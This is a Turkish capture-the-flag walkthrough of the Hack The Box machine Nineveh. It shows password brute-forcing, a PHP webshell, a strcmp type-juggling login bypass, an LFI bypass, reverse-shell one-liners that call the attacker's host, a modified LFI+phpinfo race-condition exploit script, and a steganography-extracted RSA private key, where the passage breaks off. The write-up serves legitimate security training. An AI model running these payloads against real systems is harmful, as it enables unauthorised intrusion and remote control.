---
{"dg-publish":true,"permalink":"/ctf/nineveh-ctf/"}
---

Nineveh ile ilgili bazı kısımlar, modern bir HTB makinesinde beklediğim şeylerle pek uyuşmuyor – steganografi, parola brute-force ve port knocking gibi. Yine de oldukça ilginç saldırılar vardı. İki farklı şekilde shell elde etmeyi göstereceğim: phpLiteAdmin üzerinden bir web shell yazmak ve PHPinfo'yu kötüye kullanmak. Daha sonra shell erişimimi kullanarak knockd yapılandırmasını okuyacak, port knocking ile SSH’yi açacak ve steganografi ile elde ettiğim anahtar çiftiyle erişim sağlayacağım. Root yetkilerini elde etmek için ise, cron ile çalışan chkrootkit açığını istismar edeceğim.


![Pasted image 20250207204320.png](/img/user/resimler/Pasted%20image%2020250207204320.png)

```
nmap -p 80,443 -sCV 10.10.10.43      

Host is up (0.11s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.82 seconds

```


### vhost Brute Force

Sertifikada geçen **nineveh.htb** domainine ait sub-domainleri kontrol etmek istiyorum. Bunun için **wfuzz** kullanarak **Host HTTP başlığını** fuzz edeceğim.

**wfuzz'u çalıştırırken** her zaman önce **hiding flag olmadan** başlatırım, varsayılan yanıtın nasıl göründüğünü kontrol ederim ve ardından **Ctrl+C** ile işlemi durdururum. Sonrasında **varsayılan yanıtı gizlemek için uygun bayraklarla yeniden çalıştırırım**.

- HTTP sitesi için **--hh 178** (karakter uzunluğuna göre gizleme) kullandım.
- HTTPS sitesi için **--hh 49** kullandım.

Ancak **her iki durumda da herhangi bir sonuç dönmedi**.

![Pasted image 20250207205805.png](/img/user/resimler/Pasted%20image%2020250207205805.png)


### Website - TCP 80

#### Site

Site sadece basit bir başarı sayfası gösteriyor ve başka bir bilgi içermiyor.

![Pasted image 20250207205839.png](/img/user/resimler/Pasted%20image%2020250207205839.png)


#### Directory Brute Force
Ayrıca başka hangi pathlerin var olabileceğini görmek için bir forexbuster'ı başlattım. Firefox'ta index.php manuel olarak yüklenmemiş olsa da, Linux olduğu için -x php'yi ekleyeceğim ve bu her zaman tahmin etmeye değer. Bu iki ilginç yol buldu:

![Pasted image 20250207210153.png](/img/user/resimler/Pasted%20image%2020250207210153.png)

![Pasted image 20250207210938.png](/img/user/resimler/Pasted%20image%2020250207210938.png)


#### /info.php

Bu sayfa bir PHP Info sayfası sunar:

![Pasted image 20250207210958.png](/img/user/resimler/Pasted%20image%2020250207210958.png)


#### /department

Site bir giriş formu sunar:

![Pasted image 20250207211019.png](/img/user/resimler/Pasted%20image%2020250207211019.png)

Bazı temel parola tahminlerini denedim ve hata mesajlarının kullanıcının var olup olmadığını gösterdiğini fark ettim. Örneğin, admin'i denediğimde:

![Pasted image 20250207211035.png](/img/user/resimler/Pasted%20image%2020250207211035.png)

Nineveh'i denediğimde:

### Website - TCP 443

#### Site

Bu site sadece bir resim döndürür:

![Pasted image 20250207211057.png](/img/user/resimler/Pasted%20image%2020250207211057.png)

Bu, IP adresi veya nineveh.htb ile aynı ziyarettir.


#### Directory Brute Force

Burada forexbuster'ı çalıştırmak da üç yol döndürür:

![Pasted image 20250207212038.png](/img/user/resimler/Pasted%20image%2020250207212038.png)

-k --> sertifika zorunluluklarını atlar . 



#### /db

/db bir phpLiteAdmin örneği için bir oturum açma döndürür:

![Pasted image 20250207212123.png](/img/user/resimler/Pasted%20image%2020250207212123.png)

phpLiteAdmin SQLite veritabanları ile etkileşim için bir PHP arayüzüdür.

Sürüm 1.9, searchsploit bunun için exploitler olduğunu gösteriyor:

![Pasted image 20250207212201.png](/img/user/resimler/Pasted%20image%2020250207212201.png)

Bunları **searchsploit -x [path]** ile incelediğimde:

- **İlk exploit** sürümle eşleşiyor ve komut çalıştırmak için iyi bir seçenek gibi görünüyor.
- **İkinci exploit** de çalışabilir, ancak SQLi (SQL Injection) kullanmam gerekiyor.
- **Üçüncü exploit** sürümle eşleşmiyor, bu yüzden kullanışlı değil.
- **Dördüncü exploit** ise **XSS ve CSRF gibi daha az ilgi çekici zafiyetler içeriyor**.

Ancak, **hepsini kullanabilmek için önce kimlik doğrulaması yapmam gerekiyor**.


#### /secure_notes

Bu sayfa sadece bir resimdir:

![Pasted image 20250207212325.png](/img/user/resimler/Pasted%20image%2020250207212325.png)


## Shell as www-data (via phpLiteAdmin)

### phpLiteAdmin Brute Force

Modern HTB'de, **brute force saldırıları için açık bir işaret olmadıkça parola zorlaması gerekmiyor**. Ancak **Nineveh, bu kuraldan önceki bir makine olmalı**.

Elimde yalnızca **bir parola alanı** olduğu için ve **muhtemel bir kod çalıştırma zafiyeti** bulunduğundan, **phpLiteAdmin'e Hydra ile saldırmaya başladım**.

**Web brute force işlemi için küçük bir parola listesi kullanmak daha mantıklı olur.**

- **SecLists** (apt ile **seclists** paketini yükleyerek erişebilirim)
- **twitter-banned.txt** dosyası, başlangıç için mantıklı bir liste gibi görünüyor.

```
root@kali# wc -l /usr/share/seclists/Passwords/twitter-banned.txt 
397 /usr/share/seclists/Passwords/twitter-banned.txt
```



Hydra'yı şu seçeneklerle çalıştıracağım:

- **`-l asd123`** → Hydra, kullanıcı adı gerektirir, ancak burada kullanılmayacak bile olsa bir değer vermem gerekiyor.
- **`-P [password file]`** → Denenecek parolaların bulunduğu dosya.
- **`https-post-form`** → Kullanılacak eklenti. **Üç parçadan oluşan bir string** alıyor, her biri `:` ile ayrılmış:
    1. **`/db/index.php`** → POST isteğinin gönderileceği yol.
    2. **`password=^PASS^&remember=yes&login=Log+In&proc_login=true`** → Gönderilecek POST verisi.
        - `^PASS^` → **Kelime listesindeki her parola buraya yerleştirilecek**.
    3. **`Incorrect password`** → Başarısız giriş denemelerinde dönen hata mesajı.

Hydra **hızlı bir şekilde doğru parolayı buluyor**

![Pasted image 20250207213138.png](/img/user/resimler/Pasted%20image%2020250207213138.png)

![Pasted image 20250207213153.png](/img/user/resimler/Pasted%20image%2020250207213153.png)

### Enumerate phpLiteAdmin

Şifre ile giriş yapabiliyorum:

![Pasted image 20250207213217.png](/img/user/resimler/Pasted%20image%2020250207213217.png)

Yalnızca bir veritabanı vardır, test ve tabloları yoktur.


### PHP Injection

searchsploit'teki 24044.txt exploit'i, aşağıdaki adımları kullanarak RCE elde etmek için phpLiteAdmin'den nasıl yararlanılacağını açıklar:

1. .php ile biten yeni bir veritabanı oluşturun:

![Pasted image 20250207213329.png](/img/user/resimler/Pasted%20image%2020250207213329.png)

</picture>

Yeni db'ye geçmek için üzerine tıklayacağım ve temel bir PHP webshell'in varsayılan değerine sahip 1 metin alanı içeren bir tablo oluşturacağım:

![Pasted image 20250207213359.png](/img/user/resimler/Pasted%20image%2020250207213359.png)

```
<?php system($_REQUEST["cmd"]); ?>
```

![Pasted image 20250207214936.png](/img/user/resimler/Pasted%20image%2020250207214936.png)

Sayfayı görüntüleyin.

Ne yazık ki burada takıldım. Yeni .php webshell'in yolunu /var/tmp içinde görebiliyorum:

![Pasted image 20250207215041.png](/img/user/resimler/Pasted%20image%2020250207215041.png)

Ancak bir tarayıcıda bu sayfaya erişmek için gerekli LFI'den yoksundum.


### /department Type Confusion

Admin kullanıcı adını zaten tespit edebildiğim için, burada da parolayı brute-force ile kırmayı deneyebilirim (ve yeterince büyük bir liste, örneğin _rockyou.txt_ kullanarak başarılı olabilirim). Ancak bunu yapmadan önce, PHP tür karmaşası (_type juggling_) hatası olup olmadığını kontrol etmek için parola alanına bir dizi (_array_) gönderdim.

Firefox üzerinden formu gönderdiğimde, Burp POST verisini şu şekilde gösterdi:

```
username=admin&password=admin
```

Eğer bunu şöyle değiştirirsem:

![Pasted image 20250207220143.png](/img/user/resimler/Pasted%20image%2020250207220143.png)

```
username=admin&password[]=
```

Beni içeri alıyor:

![Pasted image 20250207220344.png](/img/user/resimler/Pasted%20image%2020250207220344.png)

Bu neden işe yarıyor? PHP farklı veri türlerini karşılaştırma konusunda cömerttir. Dolayısıyla, PHP bir veritabanından alınan (veya burada olduğu gibi sabit kodlanmış) bir parola ile kullanıcı girdisini bir string karşılaştırması yapıyorsa, bu aşağıdaki gibi görünebilir:

```
if(strcmp($_REQUEST['password'], $password) == 0)
```

strcmp, etkileşimli bir PHP terminalinde görebildiğim gibi (==php -a=='yı çalıştırın) iki stringin farklı olduğu yeri döndürür:

```
php > strcmp("admin", "0xdf");
php > echo strcmp("admin", "0xdf");
1
php > echo strcmp("admin", "admin0xdf");
-4
php > echo strcmp("admin", "admin");
0
```


Stringlerden biri olarak bir array geçersem PHP başarısız olur:

```
php > echo strcmp(array(), "admin");
PHP Warning:  strcmp() expects parameter 1 to be string, array given in php shell code on line 1
```

Ancak, aslında bir NULL döndürür ve bu NULL daha sonra 0 ile karşılaştırılırsa doğru olarak değerlendirilir:

```
php > if (strcmp(array(), "admin") == 0) { echo "oops"; }
PHP Warning:  strcmp() expects parameter 1 to be string, array given in php shell code on line 1
oops
```



---

Burada **PHP'deki `strcmp` fonksiyonunun nasıl çalıştığını ve bir güvenlik açığına yol açabilecek bir durumun nasıl oluştuğunu** anlatıyor.

### `strcmp` Fonksiyonunun Çalışma Mantığı:

`strcmp(string1, string2)` → İki string karşılaştırılır ve:

- **0 dönerse** → İki string **aynıdır**.
- **Pozitif bir sayı dönerse** → `string1`, `string2`'den **büyük** (alfabetik olarak sonra gelen) bir değere sahiptir.
- **Negatif bir sayı dönerse** → `string1`, `string2`'den **küçük** (alfabetik olarak önce gelen) bir değere sahiptir.


Örnek Çıktılar:

```
php > echo strcmp("admin", "0xdf");
1 // "admin" > "0xdf"
```

`"admin"`, `"0xdf"`'den alfabetik olarak büyük olduğu için **pozitif** değer döndürdü.

```
php > echo strcmp("admin", "admin0xdf");
-4 // "admin" < "admin0xdf"
```

Burada `"admin"`, `"admin0xdf"`'den **küçük** olduğu için **negatif** değer döndü.

```
php > echo strcmp("admin", "admin");
0 // "admin" == "admin"
```

Aynı iki string karşılaştırıldığı için **0** döndü.

### Zafiyete Yol Açabilecek Durum:

Eğer `strcmp`'e **dizi (`array`)** verilirse, PHP bir **uyarı veriyor** ancak **NULL dönüyor**.

```
php > echo strcmp(array(), "admin");
PHP Warning:  strcmp() expects parameter 1 to be string, array given in php shell code on line 1
```

Burada hata mesajı gözükse de, **asıl dönüş değeri NULL**.

Ancak **NULL değeri `0` ile karşılaştırıldığında "eşit" kabul ediliyor**!

```
php > if (strcmp(array(), "admin") == 0) { echo "oops"; }
PHP Warning:  strcmp() expects parameter 1 to be string, array given in php shell code on line 1
oops
```

Burada:

- `strcmp(array(), "admin")` **NULL döndü**.
- **NULL == 0** olduğu için **"oops" ekrana yazdırıldı**.


### Bu Ne Anlama Geliyor?

```
if (strcmp($password, "admin") == 0) {
    // Giriş başarılı!
}
```

Eğer `$password` olarak **bir array gönderirsek**, `strcmp` NULL döndürür ve **NULL == 0 olarak değerlendirildiği için giriş başarılı olur**!

**Bu bir PHP zafiyetidir ve kimlik doğrulama bypass edilebilir!**

----


### Enumerate manage.php

Giriş yaptıktan sonra, yukarıda gösterildiği gibi **manage.php** sayfasına yönlendiriliyorum.  

Ana sayfa düğmesi, yalnızca **"Yapım Aşamasında"** görselini gösteriyor.  
Buna ek olarak, bir **Notes (Notlar)** düğmesi var ve bu düğme, **?notes=files/ninevehNotes.txt** parametresini aynı PHP sayfasına ekleyerek görselin altına bu metni yerleştiriyor:

![Pasted image 20250207225434.png](/img/user/resimler/Pasted%20image%2020250207225434.png)

"
Giriş sayfasını düzelttin mi! Sabitlenmiş kullanıcı adı ve şifre gerçekten kötü bir fikir!

İçeri girmek için **secret** (gizli) klasörünü kontrol et! Bunu çözmen gerekiyor!

**Veritabanı arayüzünü geliştirin.**  
~amrois

"

Sabitlenmiş kullanıcı adı ve şifreye sahip giriş sayfası, muhtemelen **type confusion** (tip karışıklığı) ile bypass ettiğim şeydir. **Gizli klasör** referansı ilginç. Buna daha sonra döneceğim. Ve **veritabanı arayüzü** ise zaten **istismar ettiğim bir şey**.


### LFI POC

Ne zaman argüman olarak bir dosya yolu veren bir url görsem, lokal file include için onu kurcalamak istiyorum (özellikle şimdi RCE'yi almak için ihtiyacım olan şey bu olduğu için).

Neler olup bittiğini anlamak için birkaç şey denedim:

| notes parameter                                            | Error Message                                                                                                                            |
| ---------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| `ninevehNotes.txt`                                         | No error, displays note                                                                                                                  |
| `/etc/passwd`                                              | No Note is selected.                                                                                                                     |
| `../../../../../../../../../../etc/passwd`                 | No Note is selected.                                                                                                                     |
| `ninevehNotes`                                             | Warning: include(files/ninevehNotes): failed to open stream: No such file or directory in /var/www/html/department/manage.php on line 31 |
| `ninevehNote`                                              | No Note is selected.                                                                                                                     |
| `files/ninevehNotes/../../../../../../../../../etc/passwd` | File name too long.                                                                                                                      |
| `files/ninevehNotes/../../../../../../../etc/passwd`       | The contents of `/etc/passwd`                                                                                                            |
| `/ninevehNotes/../etc/passwd`                              | The contents of `/etc/passwd`                                                                                                            |


Bir süre fark etmedim ama anlaşılan o ki, parametrede **ninevehNotes** ifadesi kontrol ediliyor, ya da sadece **"No Note is selected"** (Seçili Not Yok) mesajını gösteriyor. Ancak bunun etrafından dolanmanın birkaç yolu var; mesela uzantıyı kaldırıp dizinleri yukarıya çıkarabilir veya **/** ile başlayıp mevcut olmayan **ninevehNotes** klasörüne girip hemen çıkmak için **../** kullanabilirim. Sistem, bu iki yöntemi engelliyor ama PHP'nin string kontrolünü geçmesine izin veriyor.


### RCE

Şimdi daha önce http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/0xdf.php&cmd=id adresinde bıraktığım webshell'e erişebiliyorum

![Pasted image 20250207230127.png](/img/user/resimler/Pasted%20image%2020250207230127.png)


### Shell

Bir shell almak için, komutu şu şekilde değiştireceğim:

```
bash -c 'bash -i >%26 /dev/tcp/10.10.16.9/443 0>%261'
```

Bir shell almak için, cmd'yi bash -c 'bash -i >%26 /dev/tcp/10.10.14.24/443 0>%261' olarak değiştireceğim (& işaretlerini url olarak kodlamak önemlidir, aksi takdirde yeni bir parametre başlatıyormuş gibi yorumlanırlar). Nc'de bir shell alıyorum:

![Pasted image 20250207230411.png](/img/user/resimler/Pasted%20image%2020250207230411.png)


Python2, Nineveh'de yüklü değil, ama Python3 var.

```
www-data@nineveh:/var/www/html/department$ python -c 'import pty;pty.spawn("bash")'
The program 'python' can be found in the following packages:
 * python-minimal
 * python3
Ask your administrator to install one of them
www-data@nineveh:/var/www/html/department$ python3 -c 'import pty;pty.spawn("bash")'
```

Tamamen işlevsel bir shell elde etmek için Ctrl-z, stty raw -echo, fg, reset yapacağım.

www-data olarak, /home/amrois içinde user.txt dosyasını görebiliyorum ama okuyamıyorum.


## Shell as www-data (via phpinfo.php)

### Background

Ippsec'in bu tekniği [**Poison**](https://youtu.be/rs4zEwONzzk?t=601) videosunda istismar ettiğini hatırlıyorum. **Insomnia Security**'nin 2011 tarihli çok hoş bir [makalesi](https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf) var, LFI + PHPINFO = RCE nasıl çalıştığını anlatıyor. İlk olarak, PHP'nin **file_uploads = on** olarak yapılandırılmış olması gerekiyor. Neyse ki, burada durum böyle.

Bu, herhangi bir PHP isteğinin yüklenen dosyaları kabul edeceği ve bu dosyaların PHP isteği tamamlanana kadar geçici bir dizine kaydedileceği, ardından ise silineceği anlamına gelir. PHPINFO, bu dosyaların listesini gösterecek şekilde yapılandırılmıştır. Bunu, Burp Proxy üzerinden /info.php isteğini yakalayıp, ardından isteği şu şekilde bir dummy dosya içeren bir POST isteğine dönüştürerek gösterebilirim:

```
POST /info.php HTTP/1.1
Host: 10.10.10.43
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=ehjpe8sp040ma068aen884obr7
Upgrade-Insecure-Requests: 1
Content-Length: 194
Content-Type: multipart/form-data; boundary=---------------------------7db268605ae

-----------------------------7db268605ae
Content-Disposition: form-data; name="dummyname"; filename="test.txt" Content-Type: text/plainSecurity
Test
-----------------------------7db268605ae
```

GET'i POST olarak değiştirdim, Content-Type başlığını ve POST body'yi ekledim.

Ortaya çıkan sayfa bunu içeriyor:

![Pasted image 20250207231202.png](/img/user/resimler/Pasted%20image%2020250207231202.png)

Bu, dosyanın nerede saklandığının dosya adını içeriyor!

Bu dosya yalnızca bir saniyenin onda biri kadar var olsa da, bazen yarışı kazanıp dosya kaybolmadan önce sayfayı ziyaret edebiliyorum. **Insomnia**, HTTP başlıklarına çok fazla padding (boşluk) ekleyerek işleme süresini artırıyor ve böylece saldırganın yarışı kazanma şansını yükseltiyor.

### Script Modifications

Insomnia bunu kullanacak bir Python scripti sağlıyor. Onu indireceğim, ancak bu durumda çalışması için biraz düzenleme gerekiyor.

İlk olarak, en üstte ihtiyaç duyacağım bazı değişkenleri toplayacağım:

```
local_ip = "10.10.14.24"
local_port = 443
phpsessid = "ehjpe8sp040ma068aen884obr7"
```


**PHPSESSID**, geçerli bir oturuma işaret etmelidir. Eğer bunu baştan yazıyor olsaydım, scripti sadece oturum açacak ve böylece bir oturum kimliği alacak şekilde yazardım, ama burada şu an karışmak istemediğim çok şey var.

Şimdi, üstteki **setup** fonksiyonunda bir sürü şeyi değiştireceğim.

```
def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r <?php system("bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'");?>\r""" % (TAG, local_ip, local_port)
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /info.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=""" + phpsessid + """; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /department/manage.php?notes=/ninevehNotes/..%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Cookie: PHPSESSID=""" + phpsessid + """\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)
```


Aşağıdaki değişiklikleri yaptım:

- Payload'u, yukarıda belirtilen IP ve port’a geri bağlantı verecek şekilde değiştirdim.
- **REQ1**'deki POST yolunu, **/phpinfo.php** yerine Nineveh ile uyumlu olması için **/info.php** olarak değiştirdim.
- **LFIREQ**'deki POST yolunu, Nineveh LFI'si ile uyumlu olacak şekilde değiştirdim.
- LFI'ye erişebilmek için **LFIREQ**'ye bir **PHPSESSID** çerezi ekledim.
- Diğer değiştirmem gereken şey, yanıt içinde [tmp_name] => arayan iki yerdi. PHP artık bunu **[tmp_name] =>** olarak HTML encode ediyor, bu yüzden bunu düzeltmem gerekiyor. İlginç bir şekilde, makalede de encode edilmiş sürümü var, bu da scriptte bir hata olabilir.


### Shell

Bu değişiklikler yapıldığında, komut dosyasını bir nc listener beklerken çalıştırabilirim:

```
root@kali# python phpinfolfi.py 10.10.10.43 80 100
LFI With PHPInfo()
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Getting initial offset... found [tmp_name] at 125163
Spawning worker pool (100)...
 101 /  1000
```

O noktada, nc'de bir shell geldi:

```
root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.43.
Ncat: Connection from 10.10.10.43:43916.
bash: cannot set terminal process group (1387): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


## Priv: www-data –> amrois

### Enumeration

Bu kutuda fazla bir şey bulamayınca, zaten sahip olduğum ipuçlarına geri döndüm, özellikle yalnızca bir resim çıktısı veren /secure_notes dizini ve giriş yapmak için gizli klasöre bakmam gerektiğini belirten giriş sayfasındaki not, bu da bir zorluk yaratıyordu.

/secure_notes dizininde sadece .png dosyası ve index.html bulunuyor:

```
www-data@nineveh:/var/www/ssl/secure_notes$ ls
index.html  nineveh.png
```

Bir CTF sizi bir yere yönlendirdiğinde ve orada sadece bir resim bulduğunuzda, resmi biraz daha detaylı incelemek faydalı olabilir. Strings komutunu çalıştırmak bu düşünceyi doğruluyor:

```
www-data@nineveh:/var/www/ssl/secure_notes$ strings -n 20 nineveh.png -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5 FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI 3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo 9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl 1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89 P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1 MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7 fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG -----END RSA PRIVATE KEY----- ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
```


### Pull Apart Steg

Buna biraz daha dikkatli bakmak için, Firefox'a gidip bu resmi local makinemde indiriyorum. **Binwalk** çalıştırmak, dosyanın sonuna bir tar arşivinin eklendiğini gösteriyor.

```
root@kali# binwalk nineveh.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)
```

Tüm dosyaları ayıklamak için -e kullanabilirim ve arşivi bile açacaktır:

```
root@kali# binwalk -e nineveh.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)

root@kali# find _nineveh.png.extracted/
_nineveh.png.extracted/
_nineveh.png.extracted/54
_nineveh.png.extracted/2BF8D0.tar
_nineveh.png.extracted/54.zlib
_nineveh.png.extracted/secret
_nineveh.png.extracted/secret/nineveh.priv
_nineveh.png.extracted/secret/nineveh.pub
```

Private key normal görünüyor:

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
